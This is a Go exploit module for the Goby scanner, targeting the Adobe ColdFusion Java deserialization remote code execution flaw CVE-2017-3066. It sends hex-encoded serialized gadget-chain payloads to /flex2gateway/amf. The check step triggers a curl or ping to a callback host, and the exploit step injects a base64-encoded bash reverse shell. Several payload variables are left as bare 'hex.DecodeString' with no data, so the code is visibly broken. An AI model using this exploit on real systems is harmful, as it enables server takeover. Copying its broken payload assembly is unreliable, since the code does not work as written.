package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion Java Deserialization RCE (CVE-2017-3066)",
    "Description": "<p>Adobe ColdFusion is a dynamic web server product of Adobe.</p><p>There is a java deserialization vulnerability in Adobe ColdFusion. An attacker can use this vulnerability to execute arbitrary code in the context of the affected application, resulting in the takeover of server permissions.</p>",
    "Impact": "Adobe ColdFusion Java Deserialization RCE (CVE-2017-3066)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html\">https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Adobe-ColdFusion",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion 服务器产品存在 JAVA 反序列化漏洞（CVE-2017-3066）",
            "Description": "<p>Adobe ColdFusion是美国奥多比（Adobe）公司的一款动态Web服务器产品。</p><p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码，导致接管服务器权限。</p>",
            "Impact": "<p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码，导致接管服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html\">https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Adobe-ColdFusion",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion Java Deserialization RCE (CVE-2017-3066)",
            "Description": "<p>Adobe ColdFusion is a dynamic web server product of Adobe.</p><p>There is a java deserialization vulnerability in Adobe ColdFusion. An attacker can use this vulnerability to execute arbitrary code in the context of the affected application, resulting in the takeover of server permissions.</p>",
            "Impact": "Adobe ColdFusion Java Deserialization RCE (CVE-2017-3066)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html\">https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Adobe-ColdFusion",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\")",
    "GobyQuery": "(body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2017-11-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2017-3066"
    ],
    "CNVD": [
        "CNVD-2017-06457"
    ],
    "CNNVD": [
        "CNNVD-201704-1418"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [
            "Adobe-ColdFusion"
        ],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10233"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			payload1, _ := hex.DecodeString("0003000000010000000000000001110A07476F72672E6170616368652E61786973322E7574696C2E4D65746144617461456E7472797C998BD2C64FB4E30000000201000000")
			payload3, _ := hex.DecodeString("ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B7870000000027372002B6F72672E6170616368652E636F6D6D6F6E732E6265616E7574696C732E4265616E436F6D70617261746F72CF8E0182FE4EF17E0200024C000A636F6D70617261746F7271007E00014C000870726F70657274797400124C6A6176612F6C616E672F537472696E673B78707372003F6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707400106F757470757450726F706572746965737704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D6571007E00044C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E002000078700000")
			payload5, _ := hex.DecodeString
			payload8, _ := hex.DecodeString
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			if isDomain {
				cmd = "ping -c 1 " + checkUrl
			}
			payload2hex := "0" + strconv.FormatInt(2761+int64(len(cmd)), 16)
			payload2, _ := hex.DecodeString(payload2hex)
			payload4hex := "0" + strconv.FormatInt(1686+int64(len(cmd)), 16)
			payload4, _ := hex.DecodeString(payload4hex)
			payload6hex := strconv.FormatInt(int64(len(cmd)), 16)
			payload6, _ := hex.DecodeString(payload6hex)
			uri := "/flex2gateway/amf"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-amf")
			cfg.Data = string(payload1) + string(payload2) + string(payload3) + string(payload4) + string(payload5) + string(payload6) + cmd + string(payload8)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				return godclient.PullExists(checkStr, time.Second*15)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			payload1, _ := hex.DecodeString("0003000000010000000000000001110A07476F72672E6170616368652E61786973322E7574696C2E4D65746144617461456E7472797C998BD2C64FB4E30000000201000000")
			payload3, _ := hex.DecodeString
			payload5, _ := hex.DecodeString
			payload8, _ := hex.DecodeString
			uri := "/flex2gateway/amf"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-amf")
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					base64cmd := base64.StdEncoding.EncodeToString([]byte(godclient.ReverseTCPByBash(rp)))
					cmd := fmt.Sprintf(`bash -c {echo,%s}|{base64,-d}|{bash,-i}`, base64cmd)
					payload2hex := "0" + strconv.FormatInt(2761+int64(len(cmd)), 16)
					payload2, _ := hex.DecodeString(payload2hex)
					payload4hex := "0" + strconv.FormatInt(1686+int64(len(cmd)), 16)
					payload4, _ := hex.DecodeString(payload4hex)
					payload6hex := strconv.FormatInt(int64(len(cmd)), 16)
					payload6, _ := hex.DecodeString(payload6hex)
					cfg.Data = string(payload1) + string(payload2) + string(payload3) + string(payload4) + string(payload5) + string(payload6) + cmd + string(payload8)
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}
